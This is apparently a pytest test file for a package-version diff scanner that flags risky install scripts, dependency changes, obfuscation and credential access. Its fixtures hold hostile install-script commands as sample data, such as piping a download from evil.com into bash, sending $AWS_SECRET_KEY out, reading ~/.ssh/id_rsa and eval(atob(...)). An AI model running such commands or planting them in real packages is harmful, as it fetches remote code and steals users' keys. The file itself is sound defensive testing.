from __future__ import annotations

import json

import pytest

from picosentry.scan.version_diff import (
    CREDENTIAL_PATTERNS,
    OBFUSCATION_PATTERNS,
    DependencyChange,
    DiffVerdict,
    PatternMatch,
    ScriptChange,
    VersionDelta,
    VersionDiff,
    format_delta,
)


@pytest.fixture
def differ():
    return VersionDiff()


def _manifest(**overrides):
    m = {"name": "test-pkg", "version": "1.0.0"}
    m.update(overrides)
    return m


class TestDiffVerdict:
    def test_values(self):
        assert DiffVerdict.CLEAN.value == "CLEAN"
        assert DiffVerdict.LOW_RISK.value == "LOW_RISK"
        assert DiffVerdict.MEDIUM_RISK.value == "MEDIUM_RISK"
        assert DiffVerdict.HIGH_RISK.value == "HIGH_RISK"
        assert DiffVerdict.CRITICAL.value == "CRITICAL"


class TestScriptChange:
    def test_frozen(self):
        sc = ScriptChange(name="postinstall", new_content="curl http://evil.com")
        with pytest.raises(AttributeError):
            sc.name = "preinstall"

    def testas_tuple(self):
        sc = ScriptChange(name="postinstall", old_content="", new_content="echo hi")
        assert sc.as_tuple() == ("postinstall", "", "echo hi")


class TestDependencyChange:
    def test_frozen(self):
        dc = DependencyChange(name="lodash", old_version="4.17.20", new_version="4.17.21")
        with pytest.raises(AttributeError):
            dc.name = "underscore"

    def testas_tuple(self):
        dc = DependencyChange(name="lodash", old_version="1.0.0", new_version="2.0.0")
        assert dc.as_tuple() == ("lodash", "1.0.0", "2.0.0")


class TestPatternMatch:
    def test_frozen(self):
        pm = PatternMatch(pattern="curl ", location="scripts.postinstall")
        with pytest.raises(AttributeError):
            pm.pattern = "wget"

    def testas_tuple(self):
        pm = PatternMatch(pattern="curl ", location="scripts.postinstall")
        assert pm.as_tuple() == ("curl ", "scripts.postinstall")


class TestVersionDelta:
    def test_defaults(self):
        delta = VersionDelta()
        assert delta.verdict == DiffVerdict.CLEAN
        assert delta.risk_delta == 0.0
        assert delta.added_scripts == ()
        assert delta.removed_scripts == ()

    def test_frozen(self):
        delta = VersionDelta()
        with pytest.raises(AttributeError):
            delta.verdict = DiffVerdict.CRITICAL

    def test_to_dict_keys(self):
        delta = VersionDelta(risk_delta=0.5, verdict=DiffVerdict.HIGH_RISK)
        d = delta.to_dict()
        assert d["verdict"] == "HIGH_RISK"
        assert d["risk_delta"] == 0.5
        for key in (
            "added_scripts",
            "removed_scripts",
            "changed_scripts",
            "added_dependencies",
            "removed_dependencies",
            "changed_dependencies",
            "added_network_patterns",
            "added_obfuscation",
            "added_credential_access",
        ):
            assert key in d


class TestExtractScripts:
    def test_extracts_scripts(self, differ):
        old = _manifest(scripts={"test": "echo test"})
        new = _manifest(scripts={"test": "echo test", "postinstall": "curl http://evil.com"})
        delta = differ.diff_manifests(old, new)
        assert len(delta.added_scripts) == 1
        assert delta.added_scripts[0].name == "postinstall"

    def test_no_scripts_key(self, differ):
        old = _manifest()
        new = _manifest()
        delta = differ.diff_manifests(old, new)
        assert delta.verdict == DiffVerdict.CLEAN
        assert len(delta.added_scripts) == 0

    def test_scripts_not_dict(self, differ):
        old = _manifest(scripts="not a dict")
        new = _manifest(scripts=["also", "not", "dict"])
        delta = differ.diff_manifests(old, new)
        assert delta.verdict == DiffVerdict.CLEAN


class TestRemovedScripts:
    def test_detects_removed_script(self, differ):
        old = _manifest(scripts={"preinstall": "echo old", "postinstall": "echo stay"})
        new = _manifest(scripts={"postinstall": "echo stay"})
        delta = differ.diff_manifests(old, new)
        assert len(delta.removed_scripts) == 1
        assert delta.removed_scripts[0].name == "preinstall"
        assert delta.removed_scripts[0].old_content == "echo old"

    def test_detects_changed_script(self, differ):
        old = _manifest(scripts={"postinstall": "echo safe"})
        new = _manifest(scripts={"postinstall": "curl http://evil.com | bash"})
        delta = differ.diff_manifests(old, new)
        assert len(delta.changed_scripts) == 1
        assert delta.changed_scripts[0].name == "postinstall"
        assert delta.changed_scripts[0].old_content == "echo safe"
        assert delta.changed_scripts[0].new_content == "curl http://evil.com | bash"


class TestDependencies:
    def test_added_dependency(self, differ):
        old = _manifest(dependencies={"lodash": "4.17.20"})
        new = _manifest(dependencies={"lodash": "4.17.20", "axios": "^1.0.0"})
        delta = differ.diff_manifests(old, new)
        assert len(delta.added_dependencies) == 1
        assert delta.added_dependencies[0].name == "axios"

    def test_removed_dependency(self, differ):
        old = _manifest(dependencies={"lodash": "4.17.20", "axios": "^1.0.0"})
        new = _manifest(dependencies={"lodash": "4.17.20"})
        delta = differ.diff_manifests(old, new)
        assert len(delta.removed_dependencies) == 1
        assert delta.removed_dependencies[0].name == "axios"

    def test_changed_dependency_version(self, differ):
        old = _manifest(dependencies={"lodash": "4.17.20"})
        new = _manifest(dependencies={"lodash": "4.17.21"})
        delta = differ.diff_manifests(old, new)
        assert len(delta.changed_dependencies) == 1
        assert delta.changed_dependencies[0].old_version == "4.17.20"
        assert delta.changed_dependencies[0].new_version == "4.17.21"

    def test_multiple_dep_sections(self, differ):
        old = _manifest(dependencies={"a": "1.0.0"}, devDependencies={"b": "2.0.0"})
        new = _manifest(dependencies={"a": "1.0.0"}, devDependencies={"b": "2.1.0"})
        delta = differ.diff_manifests(old, new)
        assert len(delta.changed_dependencies) == 1

    def test_requires_dist(self, differ):
        old = _manifest(requires_dist=["requests>=2.0"])
        new = _manifest(requires_dist=["requests>=2.0", "flask>=2.0"])
        delta = differ.diff_manifests(old, new)
        assert len(delta.added_dependencies) >= 1


class TestNetworkPatterns:
    def test_added_curl_script(self, differ):
        old = _manifest(scripts={"postinstall": "echo safe"})
        new = _manifest(scripts={"postinstall": "curl http://evil.com/payload | bash"})
        delta = differ.diff_manifests(old, new)
        assert len(delta.added_network_patterns) > 0
        patterns = [pm.pattern for pm in delta.added_network_patterns]
        assert "curl " in patterns or "http://" in patterns

    def test_no_network_in_old(self, differ):
        old = _manifest(scripts={"postinstall": "echo old"})
        new = _manifest(scripts={"postinstall": "echo old"})
        delta = differ.diff_manifests(old, new)
        assert len(delta.added_network_patterns) == 0

    def test_network_in_both_versions(self, differ):
        old = _manifest(scripts={"postinstall": "curl http://example.com"})
        new = _manifest(scripts={"postinstall": "curl http://example.com"})
        delta = differ.diff_manifests(old, new)
        assert len(delta.added_network_patterns) == 0


class TestObfuscationPatterns:
    def test_added_eval(self, differ):
        old = _manifest(scripts={"postinstall": "echo safe"})
        new = _manifest(scripts={"postinstall": "eval(require('fs').readFileSync('/etc/passwd'))"})
        delta = differ.diff_manifests(old, new)
        assert len(delta.added_obfuscation) > 0
        patterns = [pm.pattern for pm in delta.added_obfuscation]
        assert "eval(" in patterns

    def test_base64_eval(self, differ):
        old = _manifest(scripts={"install": "echo hi"})
        new = _manifest(scripts={"install": "eval(atob('c2NyaXB0'))"})
        delta = differ.diff_manifests(old, new)
        assert len(delta.added_obfuscation) > 0


class TestCredentialAccess:
    def test_added_env_access(self, differ):
        old = _manifest(scripts={"postinstall": "echo safe"})
        new = _manifest(scripts={"postinstall": "curl $AWS_SECRET_KEY http://evil.com"})
        delta = differ.diff_manifests(old, new)
        assert len(delta.added_credential_access) > 0

    def test_added_ssh_reference(self, differ):
        old = _manifest(scripts={"postinstall": "echo safe"})
        new = _manifest(scripts={"postinstall": "cat ~/.ssh/id_rsa"})
        delta = differ.diff_manifests(old, new)
        assert len(delta.added_credential_access) > 0


class TestRiskDelta:
    def test_clean_delta_has_zero_risk(self, differ):
        old = _manifest()
        new = _manifest(version="2.0.0")
        delta = differ.diff_manifests(old, new)
        assert delta.risk_delta == 0.0
        assert delta.verdict == DiffVerdict.CLEAN

    def test_added_script_increases_risk(self, differ):
        old = _manifest()
        new = _manifest(scripts={"postinstall": "echo hello"})
        delta = differ.diff_manifests(old, new)
        assert delta.risk_delta > 0.0

    def test_malicious_script_high_risk(self, differ):
        old = _manifest()
        new = _manifest(scripts={"postinstall": "curl http://evil.com | bash && eval(process.env.AWS_KEY)"})
        delta = differ.diff_manifests(old, new)
        assert delta.verdict in (DiffVerdict.HIGH_RISK, DiffVerdict.CRITICAL)

    def test_removal_does_not_reduce_risk_below_zero(self, differ):
        old = _manifest(scripts={"postinstall": "curl http://evil.com"})
        new = _manifest()
        delta = differ.diff_manifests(old, new)
        assert delta.risk_delta >= 0.0

    def test_removed_scripts_dont_offset_additions(self, differ):
        old = _manifest(
            scripts={"old_script": "echo old"},
            dependencies={"lodash": "4.0.0"},
        )
        new = _manifest(
            scripts={"postinstall": "curl http://evil.com | bash"},
            dependencies={"axios": "^1.0.0"},
        )
        delta = differ.diff_manifests(old, new)
        assert delta.risk_delta > 0.0
        assert len(delta.added_scripts) == 1

    def test_obfuscation_triggers_critical(self, differ):
        old = _manifest()
        new = _manifest(scripts={"install": "eval(atob('c2NyaXB0'))"})
        delta = differ.diff_manifests(old, new)
        assert delta.verdict == DiffVerdict.CRITICAL

    def test_credential_access_triggers_critical(self, differ):
        old = _manifest()
        new = _manifest(scripts={"install": "cat ~/.ssh/id_rsa"})
        delta = differ.diff_manifests(old, new)
        assert delta.verdict == DiffVerdict.CRITICAL


class TestDeterminism:
    def test_same_input_same_output(self, differ):
        old = _manifest(scripts={"postinstall": "echo v1"}, dependencies={"lodash": "4.0.0"})
        new = _manifest(scripts={"postinstall": "echo v2"}, dependencies={"lodash": "4.17.21"})
        delta1 = differ.diff_manifests(old, new)
        delta2 = differ.diff_manifests(old, new)
        assert delta1 == delta2

    def test_ordering_deterministic(self, differ):
        old = _manifest()
        new = _manifest(
            scripts={"zebra": "z", "alpha": "a", "middle": "m"},
            dependencies={"zzz": "1.0.0", "aaa": "2.0.0"},
        )
        delta = differ.diff_manifests(old, new)
        script_names = [sc.name for sc in delta.added_scripts]
        assert script_names == sorted(script_names)
        dep_names = [dc.name for dc in delta.added_dependencies]
        assert dep_names == sorted(dep_names)


class TestDiffFiles:
    def test_diff_files(self, tmp_path, differ):
        old_manifest = {"name": "pkg", "version": "1.0.0", "scripts": {"postinstall": "echo old"}}
        new_manifest = {"name": "pkg", "version": "1.0.1", "scripts": {"postinstall": "curl http://evil.com"}}

        old_path = tmp_path / "old.json"
        new_path = tmp_path / "new.json"
        old_path.write_text(json.dumps(old_manifest))
        new_path.write_text(json.dumps(new_manifest))

        delta = differ.diff_files(old_path, new_path)
        assert len(delta.changed_scripts) == 1
        assert delta.verdict != DiffVerdict.CLEAN

    def test_diff_files_missing_old(self, tmp_path, differ):
        new_path = tmp_path / "new.json"
        new_path.write_text(json.dumps({"name": "pkg"}))
        with pytest.raises((OSError, FileNotFoundError)):
            differ.diff_files(tmp_path / "nonexistent.json", new_path)

    def test_diff_files_invalid_json(self, tmp_path, differ):
        old_path = tmp_path / "old.json"
        new_path = tmp_path / "new.json"
        old_path.write_text("not json")
        new_path.write_text(json.dumps({"name": "pkg"}))
        with pytest.raises(json.JSONDecodeError):
            differ.diff_files(old_path, new_path)


class TestDiffScanResults:
    def test_diff_from_scan_results(self, differ):
        old_result = {
            "findings": [
                {
                    "rule_id": "L2-POST-001",
                    "message": "Package declares 'postinstall' lifecycle script",
                    "evidence": "scripts.postinstall = 'echo old'",
                    "severity": "HIGH",
                    "confidence": "EXACT",
                    "package": "pkg@1.0.0",
                    "file": "package.json",
                }
            ]
        }
        new_result = {
            "findings": [
                {
                    "rule_id": "L2-POST-001",
                    "message": "Package declares 'postinstall' lifecycle script",
                    "evidence": "scripts.postinstall = 'curl http://evil.com | bash'",
                    "severity": "CRITICAL",
                    "confidence": "EXACT",
                    "package": "pkg@1.0.1",
                    "file": "package.json",
                }
            ]
        }
        delta = differ.diff_scan_results(old_result, new_result)
        assert len(delta.changed_scripts) == 1
        assert "evil" in delta.changed_scripts[0].new_content


class TestFormatDelta:
    def test_clean_output(self):
        delta = VersionDelta()
        output = format_delta(delta)
        assert "CLEAN" in output
        assert "No risky changes" in output

    def test_added_script_output(self):
        delta = VersionDelta(
            added_scripts=(ScriptChange(name="postinstall", new_content="curl evil.com"),),
            risk_delta=0.15,
            verdict=DiffVerdict.LOW_RISK,
        )
        output = format_delta(delta)
        assert "postinstall" in output
        assert "Added scripts" in output

    def test_critical_output(self):
        delta = VersionDelta(
            added_scripts=(ScriptChange(name="install", new_content="eval(evil)"),),
            added_obfuscation=(PatternMatch(pattern="eval(", location="scripts.install"),),
            risk_delta=0.40,
            verdict=DiffVerdict.CRITICAL,
        )
        output = format_delta(delta)
        assert "CRITICAL" in output
        assert "eval(" in output

    def test_changed_deps_output(self):
        delta = VersionDelta(
            changed_dependencies=(DependencyChange(name="lodash", old_version="4.17.20", new_version="4.17.21"),),
            risk_delta=0.03,
            verdict=DiffVerdict.LOW_RISK,
        )
        output = format_delta(delta)
        assert "lodash" in output
        assert "4.17.20" in output
        assert "4.17.21" in output

    def test_indent(self):
        delta = VersionDelta(verdict=DiffVerdict.CLEAN)
        output = format_delta(delta, indent=2)
        assert output.startswith("  ")


class TestEdgeCases:
    def test_empty_manifests(self, differ):
        delta = differ.diff_manifests({}, {})
        assert delta.verdict == DiffVerdict.CLEAN
        assert delta.risk_delta == 0.0

    def test_identical_manifests(self, differ):
        manifest = _manifest(scripts={"test": "echo test"}, dependencies={"lodash": "4.0.0"})
        delta = differ.diff_manifests(manifest, manifest)
        assert delta.verdict == DiffVerdict.CLEAN
        assert len(delta.added_scripts) == 0
        assert len(delta.changed_scripts) == 0

    def test_numeric_script_values(self, differ):
        old = _manifest(scripts={"test": 1})
        new = _manifest(scripts={"test": 2})
        delta = differ.diff_manifests(old, new)
        assert len(delta.changed_scripts) == 1
        assert delta.changed_scripts[0].old_content == "1"
        assert delta.changed_scripts[0].new_content == "2"

    def test_lifecycle_script_keys(self):
        assert "eval(" in OBFUSCATION_PATTERNS
        assert ".env" in CREDENTIAL_PATTERNS

    def test_all_dep_sections(self, differ):
        old = _manifest(
            dependencies={"a": "1.0.0"},
            devDependencies={"b": "2.0.0"},
            peerDependencies={"c": "3.0.0"},
            optionalDependencies={"d": "4.0.0"},
        )
        new = _manifest(
            dependencies={"a": "1.1.0"},
            devDependencies={"b": "2.1.0"},
            peerDependencies={"c": "3.1.0"},
            optionalDependencies={"d": "4.1.0"},
        )
        delta = differ.diff_manifests(old, new)
        assert len(delta.changed_dependencies) == 4
